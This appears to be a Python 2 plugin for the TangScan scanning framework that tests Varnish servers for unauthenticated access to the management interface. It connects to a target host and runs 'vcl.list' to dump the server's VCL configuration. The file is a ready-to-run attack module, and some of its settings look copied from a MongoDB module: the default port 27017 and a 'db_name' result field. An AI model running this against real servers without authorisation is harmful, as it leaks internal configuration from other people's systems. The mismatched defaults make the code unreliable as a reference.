#! /usr/bin/env python
# -*- coding: utf-8 -*-

"""
"""

from __future__ import print_function, absolute_import

from varnish import VarnishManager

from modules.exploit import TSExploit


__all__ = ['TangScan']


class TangScan(TSExploit):
    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            "name": "varnish 未授权访问",
            "product": "varnish",
            "product_version": "all",
            "desc": """
                varnish 未授权访问, 可能导致内网信息泄漏
            """,
            "license": self.license.TS,
            "author": ["PyNerd"],
            "ref": [
                {self.ref.url: "http://www.wooyun.org/bugs/wooyun-2012-012338"}
            ],
            "type": self.type.misconfiguration,
            "severity": self.severity.high,
            "privileged": False,
            "disclosure_date": "2010-01-01",
            "create_date": "2014-12-25"
        }

        self.register_option({
            "host": {
                "default": "",
                "required": True,
                "choices": [],
                "convert": self.convert.str_field,
                "desc": """
                    目标主机
                """
            },
            "port": {
                "default": 27017,
                "required": False,
                "choices": [],
                "convert": self.convert.int_field,
                "desc": """
                    目标端口
                """
            }
        })

        self.register_result({
            "status": False,
            "data": {
                "db_info": {
                    "db_name": ""
                }
            },
            "description": "",
            "error": "",
        })

    def verify(self):
        host = self.option.host
        port = self.option.port
        thost = host + ":" + str(port)
        try:
            conn = VarnishManager((thost,))
            vcl_list = conn.run('vcl.list')
        except Exception, e:
            self.result.error = "连接发生错误: {error}".format(error=str(e))
            return

        self.result.status = True
        self.result.result = str(vcl_list)
        self.result.description = "目标 {host} 的 varnish 可以未授权访问, vcl_list: {vcl_list}".format(
            host=self.option.host,
            vcl_list=str(vcl_list)
        )

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    from modules.main import main
    main(TangScan())
